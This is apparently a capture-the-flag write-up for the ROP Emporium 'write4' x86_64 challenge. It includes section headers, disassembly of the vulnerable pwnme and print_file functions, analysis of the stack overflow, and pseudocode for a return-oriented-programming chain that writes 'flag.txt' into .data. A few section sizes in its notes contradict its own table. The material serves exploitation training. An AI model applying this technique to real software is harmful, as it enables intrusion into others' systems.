#### Writable Sections
```
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align

  [18] .init_array       INIT_ARRAY       0000000000600df0  00000df0
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       0000000000600df8  00000df8
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .dynamic          DYNAMIC          0000000000600e00  00000e00
       00000000000001f0  0000000000000010  WA       6     0     8
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1

```

- `_pwnme` and `_print_file` are now jmps from cs register offset in .got.plt @ 0x0000000000601000
`Breakpoint 1 at 0x400510 (print_file@plt)`
`Breakpoint 2 at 0x400500 (pwnme@plt)`

```asm
0000000000400617 <usefulFunction>:
  400617:       55                      push   %rbp
  400618:       48 89 e5                mov    %rsp,%rbp
  40061b:       bf b4 06 40 00          mov    $0x4006b4,%edi
  400620:       e8 eb fe ff ff          call   400510 <print_file@plt>
  400625:       90                      nop
  400626:       5d                      pop    %rbp
  400627:       c3                      ret

0000000000400628 <usefulGadgets>:
  400628:       4d 89 3e                mov    %r15,(%r14)
  40062b:       c3                      ret
  40062c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000400500 <pwnme@plt>:
  400500:       ff 25 12 0b 20 00       jmp    *0x200b12(%rip)        # 601018 <pwnme>
  400506:       68 00 00 00 00          push   $0x0
  40050b:       e9 e0 ff ff ff          jmp    4004f0 <.plt>

0000000000400510 <print_file@plt>:
  400510:       ff 25 0a 0b 20 00       jmp    *0x200b0a(%rip)        # 601020 <print_file>
  400516:       68 01 00 00 00          push   $0x1
  40051b:       e9 d0 ff ff ff          jmp    4004f0 <.plt>


```

#### pwnme in libwrite4.so
```asm
public pwnme
pwnme proc near

s= byte ptr -20h

; __unwind {
push    rbp
mov     rbp, rsp
sub     rsp, 20h
mov     rax, cs:stdout_ptr
mov     rax, [rax]
mov     ecx, 0          ; n
mov     edx, 2          ; modes
mov     esi, 0          ; buf
mov     rdi, rax        ; stream
call    _setvbuf
lea     rdi, s          ; "write4 by ROP Emporium"
call    _puts
lea     rdi, aX8664     ; "x86_64\n"
call    _puts
lea     rax, [rbp+s]
mov     edx, 20h ; ' '  ; n
mov     esi, 0          ; c
mov     rdi, rax        ; s
call    _memset
lea     rdi, aGoAheadAndGive ; "Go ahead and give me the input already!"...
call    _puts
lea     rdi, format     ; "> "
mov     eax, 0
call    _printf
lea     rax, [rbp+s]
mov     edx, 200h       ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
lea     rdi, aThankYou  ; "Thank you!"
call    _puts
nop
leave
retn
; } // starts at 8AA
pwnme endp
```
#### print_file in libwrite4.so
```asm
; Attributes: bp-based frame

public print_file
print_file proc near

filename= qword ptr -38h
s= byte ptr -30h
stream= qword ptr -8

; __unwind {
push    rbp
mov     rbp, rsp
sub     rsp, 40h
mov     [rbp+filename], rdi
mov     [rbp+stream], 0
mov     rax, [rbp+filename]
lea     rsi, modes      ; "r"
mov     rdi, rax        ; filename
call    _fopen
mov     [rbp+stream], rax
cmp     [rbp+stream], 0
jnz     short loc_997

-->

mov     rax, [rbp+filename]
mov     rsi, rax
lea     rdi, aFailedToOpenFi ; "Failed to open file: %s\n"
mov     eax, 0
call    _printf
mov     edi, 1          ; status
call    _exit
```
In the `_pwnme` function: `s` pointer is 0x20 bytes. `_read` in 0x200 bytes maximum

In the `_print_file` function: pass the string argument for file to open. The stack is 0x40 bytes

- `.init_array` section is 0x8 bytes and is writable
- `.fini_array` section is 0x8 bytes and is writable
- `.dynamic` section is 0x10 bytes and is writeable
- `.got` section is 0x10  bytes and is writable
- `.got.plt` section is 0x8 bytes and is writable

`mov [rbp+filename], rdi` is a potential write-what-where gadget that could be abused
the challenge gives the hint `mov [rxx], rxx` as a gadget to write with

## final pseudocode (essentially __strcpy(dst[r14], src[r15]))
```asm
pop r14 (dst)
pop r15 (src)
ret
&.data
"flag.txt"
mov [r14], r15
pop rdi
.data
__print_file
```
